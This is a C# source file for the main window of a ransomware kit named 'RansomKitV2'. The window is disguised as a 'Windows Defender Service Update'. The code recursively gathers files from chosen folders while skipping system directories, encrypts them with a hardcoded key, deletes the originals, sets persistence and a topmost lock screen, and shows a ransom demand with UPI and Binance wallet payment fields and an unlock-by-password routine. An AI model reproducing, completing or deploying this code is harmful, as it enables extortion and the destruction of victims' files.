using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RansomKitV2
{
    internal sealed class MainForm : Form
    {
        private const string _UPI_ID = "yourname@upi";
        private const string _UPI_AMT = "5000";
        private const string _BNB = "0xYourBinanceWalletAddressHere";
        private const string _MAIL = "support@yourdomain.com";
        private const string _MASTER_KEY_B64 = "billahaikillaleleuskadhila";

        private readonly LaunchMode _mode;
        private RichTextBox _log;
        private ProgressBar _prog;
        private Label _fileLbl;
        private Label _statusLbl;
        private Panel _leftPanel;
        private Panel _setupPanel;
        private Panel _payPanel;
        private ListBox _pathList;
        private TextBox _pwBox;
        private Button _unlockBtn;

        private byte[] _masterKey;

        private static readonly Color _BG = Color.FromArgb(0x1a, 0x1a, 0x2e);
        private static readonly Color _BG2 = Color.FromArgb(0x16, 0x21, 0x3e);
        private static readonly Color _ACC = Color.FromArgb(0xe9, 0x45, 0x60);
        private static readonly Color _TXT = Color.FromArgb(0xea, 0xea, 0xea);
        private static readonly Color _LOG = Color.FromArgb(0x0f, 0x34, 0x60);
        private static readonly Color _OK = Color.FromArgb(0x4e, 0xcc, 0xa3);
        private static readonly Color _WARN = Color.FromArgb(0xf5, 0xa6, 0x23);

        public MainForm(LaunchMode mode)
        {
            _mode = mode;
            BuildUI();
            Load += OnLoad;
        }

        private void BuildUI()
        {
            Text = "Windows Defender Service Update";
            Size = new Size(1020, 660);
            MinimumSize = new Size(800, 520);
            BackColor = _BG;
            ForeColor = _TXT;
            StartPosition = FormStartPosition.CenterScreen;
            Font = new Font("Segoe UI", 9f);

            var topBar = new Panel { Dock = DockStyle.Top, Height = 38, BackColor = _BG2 };
            var titleLbl = new Label { Text = "● SYSTEM MONITOR", ForeColor = _ACC, Font = new Font("Segoe UI", 10f, FontStyle.Bold), AutoSize = true, Location = new Point(10, 8) };
            _statusLbl = new Label { Text = "Initializing...", ForeColor = _WARN, AutoSize = true, Anchor = AnchorStyles.Top | AnchorStyles.Right, Location = new Point(830, 10) };
            topBar.Controls.AddRange(new Control[] { titleLbl, _statusLbl });

            var botBar = new Panel { Dock = DockStyle.Bottom, Height = 46, BackColor = _BG2 };
            _prog = new ProgressBar { Location = new Point(8, 10), Size = new Size(650, 22), Style = ProgressBarStyle.Continuous, Anchor = AnchorStyles.Left | AnchorStyles.Right | AnchorStyles.Top };
            _fileLbl = new Label { Location = new Point(668, 10), Size = new Size(340, 22), ForeColor = _TXT, Font = new Font("Consolas", 8f), TextAlign = ContentAlignment.MiddleLeft, Anchor = AnchorStyles.Right | AnchorStyles.Top };
            botBar.Controls.AddRange(new Control[] { _prog, _fileLbl });

            var split = new SplitContainer { Dock = DockStyle.Fill, BackColor = _BG, SplitterDistance = 500 };

            _leftPanel = new Panel { Dock = DockStyle.Fill, BackColor = _BG };
            BuildSetupPanel();
            BuildPayPanel();
            _leftPanel.Controls.AddRange(new Control[] { _setupPanel, _payPanel });
            split.Panel1.Controls.Add(_leftPanel);

            _log = new RichTextBox { Dock = DockStyle.Fill, BackColor = _LOG, ForeColor = _TXT, Font = new Font("Consolas", 9f), BorderStyle = BorderStyle.None, ReadOnly = true };
            split.Panel2.Controls.Add(_log);

            Controls.Add(split);
            Controls.Add(botBar);
            Controls.Add(topBar);

            ShowPanel(_setupPanel);
            SetStatus("Ready", _OK);
        }

        private void BuildSetupPanel()
        {
            _setupPanel = new Panel { Dock = DockStyle.Fill, BackColor = _BG };
            var hdrBar = new Panel { Dock = DockStyle.Top, Height = 38, BackColor = _BG };
            hdrBar.Controls.Add(new Label { Text = "SELECT PATHS TO PROCESS", ForeColor = _ACC, Font = new Font("Segoe UI", 10f, FontStyle.Bold), AutoSize = true, Location = new Point(12, 10) });

            _pathList = new ListBox { Dock = DockStyle.Fill, BackColor = _BG2, ForeColor = _TXT, BorderStyle = BorderStyle.FixedSingle };

            var strip = new Panel { Dock = DockStyle.Bottom, Height = 60, BackColor = _BG };
            var btnAdd = new Button { Text = "Add Path", Location = new Point(10, 15), Size = new Size(100, 30), BackColor = _BG2, ForeColor = _TXT, FlatStyle = FlatStyle.Flat };
            btnAdd.Click += (s, e) => {
                using (var fbd = new FolderBrowserDialog())
                    if (fbd.ShowDialog() == DialogResult.OK) _pathList.Items.Add(fbd.SelectedPath);
            };

            var btnStart = new Button { Text = "Start Processing", Location = new Point(120, 15), Size = new Size(130, 30), BackColor = _ACC, ForeColor = Color.White, FlatStyle = FlatStyle.Flat };
            btnStart.Click += async (s, e) => await EncryptAsync();

            strip.Controls.AddRange(new Control[] { btnAdd, btnStart });
            _setupPanel.Controls.Add(_pathList);
            _setupPanel.Controls.Add(strip);
            _setupPanel.Controls.Add(hdrBar);
        }

        private void BuildPayPanel()
        {
            _payPanel = new Panel { Dock = DockStyle.Fill, BackColor = _BG, Visible = false };
            var lbl = new Label { Text = "Your files have been encrypted.\nPay to unlock.", ForeColor = _ACC, Font = new Font("Segoe UI", 14f, FontStyle.Bold), AutoSize = true, Location = new Point(50, 50) };
            var lblInfo = new Label { Text = $"UPI: {_UPI_ID}\nAmount: {_UPI_AMT}\nBinance: {_BNB}\nEmail: {_MAIL}", ForeColor = _TXT, Font = new Font("Segoe UI", 10f), AutoSize = true, Location = new Point(50, 120) };

            _pwBox = new TextBox { Location = new Point(50, 250), Width = 300, BackColor = _BG2, ForeColor = _TXT, BorderStyle = BorderStyle.FixedSingle };
            _unlockBtn = new Button { Text = "Unlock", Location = new Point(360, 248), Size = new Size(100, 26), BackColor = _OK, ForeColor = _BG, FlatStyle = FlatStyle.Flat };
            _unlockBtn.Click += async (s, e) => await DecryptAsync();

            _payPanel.Controls.AddRange(new Control[] { lbl, lblInfo, _pwBox, _unlockBtn });
        }

        private void OnLoad(object sender, EventArgs e)
        {
            Log("System initialized.");

            if (Persistence.IsLocked())
            {
                List<string> savedPaths = Persistence.LoadPaths();
                Log($"Loaded {savedPaths.Count} saved paths from registry.");
                foreach (string path in savedPaths)
                {
                    if (!_pathList.Items.Contains(path)) _pathList.Items.Add(path);
                }
            }

            if (Persistence.IsLocked() || _mode == LaunchMode.Silent || _mode == LaunchMode.ManualDecrypt)
            {
                Log("System locked. Awaiting payment.");
                ShowPanel(_payPanel);
                SetStatus("Locked", _ACC);
                this.TopMost = true;
            }
        }

        private async Task EncryptAsync()
        {
            if (_pathList.Items.Count == 0) { MessageBox.Show("Please add at least one path."); return; }
            _masterKey = CryptoEngine.SafeFromBase64(_MASTER_KEY_B64);
            if (_masterKey == null) { MessageBox.Show("Invalid Master Key!"); return; }

            List<string> pathsToSave = new List<string>();
            foreach (var item in _pathList.Items) { pathsToSave.Add(item.ToString()); }
            Persistence.SavePaths(pathsToSave);

            ShowPanel(null);
            SetStatus("Scanning...", _WARN);
            _prog.Style = ProgressBarStyle.Marquee;

            string myExe = Application.ExecutablePath;
            string currentDir = AppDomain.CurrentDomain.BaseDirectory;
            string winDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            string sysDir = Environment.GetFolderPath(Environment.SpecialFolder.System);
            string dotnet86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + @"\dotnet";
            string dotnet64 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\dotnet";

            List<string> targetFiles = new List<string>();

            await Task.Run(() =>
            {
                foreach (string path in _pathList.Items)
                {
                    Log($"Scanning directory: {path}");
                    List<string> files = SafeGetFiles(path);
                    foreach (string file in files)
                    {
                        if (!ShouldSkip(file, myExe, currentDir, winDir, sysDir, dotnet86, dotnet64))
                        {
                            targetFiles.Add(file);
                        }
                    }
                }
            });

            targetFiles = targetFiles.Distinct().ToList();

            if (targetFiles.Count == 0)
            {
                bool hasLockedFiles = false;
                await Task.Run(() =>
                {
                    foreach (string path in _pathList.Items)
                    {
                        List<string> files = SafeGetFiles(path);
                        if (files.Exists(f => f.EndsWith(CryptoEngine.LOCKED_EXT, StringComparison.OrdinalIgnoreCase)))
                        {
                            hasLockedFiles = true;
                            break;
                        }
                    }
                });

                if (hasLockedFiles)
                {
                    Log("Files are already encrypted. Locking the system.");
                    Persistence.Enable();
                    Invoke(new Action(() => { this.TopMost = true; }));
                    SetStatus("Locked", _ACC);
                    ShowPanel(_payPanel);
                    return;
                }

                Log("No valid files found to encrypt.");
                SetStatus("Ready", _OK);
                ShowPanel(_setupPanel);
                _prog.Style = ProgressBarStyle.Continuous;
                return;
            }

            _prog.Style = ProgressBarStyle.Continuous;
            _prog.Maximum = targetFiles.Count;
            _prog.Value = 0;
            SetStatus($"Encrypting 0 / {targetFiles.Count}", _WARN);
            Log($"Found {targetFiles.Count} files. Starting encryption...");

            int count = 0;
            int failed = 0;

            await Task.Run(() =>
            {
                foreach (string file in targetFiles)
                {
                    try
                    {
                        string fileName = Path.GetFileName(file);
                        Invoke(new Action(() => { _fileLbl.Text = fileName; }));
                        Log($"[{count + failed + 1}/{targetFiles.Count}] Encrypting: {fileName}");

                        string outFile = file + CryptoEngine.LOCKED_EXT;
                        CryptoEngine.EncryptFile(file, outFile, _masterKey);
                        File.Delete(file);
                        count++;

                        Invoke(new Action(() => {
                            _prog.Value = count + failed;
                            _statusLbl.Text = $"Encrypting {count + failed} / {targetFiles.Count}";
                        }));
                    }
                    catch (Exception ex)
                    {
                        failed++;
                        Log($"Failed {Path.GetFileName(file)}: {ex.Message}", _ACC);
                        Invoke(new Action(() => {
                            _prog.Value = count + failed;
                            _statusLbl.Text = $"Encrypting {count + failed} / {targetFiles.Count}";
                        }));
                    }
                }
            });

            Persistence.Enable();
            Invoke(new Action(() => { this.TopMost = true; }));

            SetStatus("Locked", _ACC);
            ShowPanel(_payPanel);
            Log($"Encryption complete. {count} files locked. {failed} files were skipped.");
        }

        private List<string> SafeGetFiles(string path)
        {
            List<string> files = new List<string>();
            try { files.AddRange(Directory.GetFiles(path)); } catch { }

            try
            {
                foreach (string dir in Directory.GetDirectories(path))
                {
                    try
                    {
                        if ((File.GetAttributes(dir) & FileAttributes.ReparsePoint) == FileAttributes.ReparsePoint) continue;
                        files.AddRange(SafeGetFiles(dir));
                    }
                    catch { }
                }
            }
            catch { }
            return files;
        }

        private bool ShouldSkip(string file, string myExe, string currentDir, string winDir, string sysDir, string dotnet86, string dotnet64)
        {
            if (file.EndsWith(CryptoEngine.LOCKED_EXT, StringComparison.OrdinalIgnoreCase)) return true;
            if (file.StartsWith(currentDir, StringComparison.OrdinalIgnoreCase)) return true;
            if (file.Equals(myExe, StringComparison.OrdinalIgnoreCase)) return true;
            if (file.StartsWith(winDir, StringComparison.OrdinalIgnoreCase)) return true;
            if (file.StartsWith(sysDir, StringComparison.OrdinalIgnoreCase)) return true;
            if (file.StartsWith(dotnet86, StringComparison.OrdinalIgnoreCase)) return true;
            if (file.StartsWith(dotnet64, StringComparison.OrdinalIgnoreCase)) return true;

            if (file.IndexOf(@"\WindowsApps\", StringComparison.OrdinalIgnoreCase) >= 0) return true;
            if (file.IndexOf(@"\System Volume Information\", StringComparison.OrdinalIgnoreCase) >= 0) return true;
            if (file.IndexOf(@"\$Recycle.Bin\", StringComparison.OrdinalIgnoreCase) >= 0) return true;
            if (file.IndexOf(@"\ProgramData\Microsoft\Windows\", StringComparison.OrdinalIgnoreCase) >= 0) return true;

            return false;
        }

        private async Task DecryptAsync()
        {
            string password = _pwBox.Text.Trim();
            if (string.IsNullOrEmpty(password)) return;

            if (!CryptoEngine.VerifyPassword(password, _MASTER_KEY_B64))
            {
                Log("Invalid password.", _ACC);
                MessageBox.Show("Invalid Password!");
                return;
            }

            _masterKey = CryptoEngine.SafeFromBase64(_MASTER_KEY_B64);

            _unlockBtn.Enabled = false;
            SetStatus("Scanning...", _OK);
            _prog.Style = ProgressBarStyle.Marquee;

            List<string> targetFiles = new List<string>();

            await Task.Run(() =>
            {
                foreach (string path in _pathList.Items)
                {
                    List<string> files = SafeGetFiles(path);
                    foreach (string file in files)
                    {
                        if (file.EndsWith(CryptoEngine.LOCKED_EXT, StringComparison.OrdinalIgnoreCase))
                            targetFiles.Add(file);
                    }
                }
            });

            targetFiles = targetFiles.Distinct().ToList();

            if (targetFiles.Count == 0)
            {
                Log("No locked files found.");
                SetStatus("Unlocked", _OK);
                _prog.Style = ProgressBarStyle.Continuous;
                MessageBox.Show("No encrypted files found. Returning to main window.");

                _pwBox.Text = "";
                _unlockBtn.Enabled = true;
                Persistence.Disable();
                this.TopMost = false;
                ShowPanel(_setupPanel);
                return;
            }

            _prog.Style = ProgressBarStyle.Continuous;
            _prog.Maximum = targetFiles.Count;
            _prog.Value = 0;
            SetStatus($"Decrypting 0 / {targetFiles.Count}", _OK);
            Log($"Found {targetFiles.Count} locked files. Starting decryption...");

            int count = 0;
            int failed = 0;

            await Task.Run(() =>
            {
                foreach (string file in targetFiles)
                {
                    try
                    {
                        string fileName = Path.GetFileName(file);

                        Invoke(new Action(() => { _fileLbl.Text = fileName; }));
                        Log($"[{count + failed + 1}/{targetFiles.Count}] Decrypting: {fileName}");

                        string outFile = file.Substring(0, file.Length - CryptoEngine.LOCKED_EXT.Length);
                        CryptoEngine.DecryptFile(file, outFile, _masterKey);
                        File.Delete(file);
                        count++;

                        Invoke(new Action(() => {
                            _prog.Value = count + failed;
                            _statusLbl.Text = $"Decrypting {count + failed} / {targetFiles.Count}";
                        }));
                    }
                    catch (Exception ex)
                    {
                        failed++;
                        Log($"Failed to decrypt {Path.GetFileName(file)}: {ex.Message}", _ACC);
                        Invoke(new Action(() => {
                            _prog.Value = count + failed;
                            _statusLbl.Text = $"Decrypting {count + failed} / {targetFiles.Count}";
                        }));
                    }
                }
            });

            Persistence.Disable();
            Invoke(new Action(() => { this.TopMost = false; }));

            Log($"Decryption complete. Restored {count} files.");
            SetStatus("Unlocked", _OK);

            if (failed > 0)
                MessageBox.Show($"Decryption complete! Restored {count} files. ({failed} failed)");
            else
                MessageBox.Show($"Decryption complete! Restored {count} files.");

            _pwBox.Text = "";
            _unlockBtn.Enabled = true;
            ShowPanel(_setupPanel);
        }

        private void ShowPanel(Panel p)
        {
            _setupPanel.Visible = false;
            _payPanel.Visible = false;
            if (p != null) p.Visible = true;
        }

        private void SetStatus(string text, Color c)
        {
            _statusLbl.Text = text;
            _statusLbl.ForeColor = c;
        }

        private void Log(string msg)
        {
            if (InvokeRequired) { Invoke(new Action(() => Log(msg))); return; }
            _log.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\n");
            _log.ScrollToCaret();
        }

        private void Log(string msg, Color c)
        {
            if (InvokeRequired) { Invoke(new Action(() => Log(msg, c))); return; }
            _log.SelectionStart = _log.TextLength;
            _log.SelectionLength = 0;
            _log.SelectionColor = c;
            _log.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\n");
            _log.SelectionColor = _log.ForeColor;
            _log.ScrollToCaret();
        }
    }
}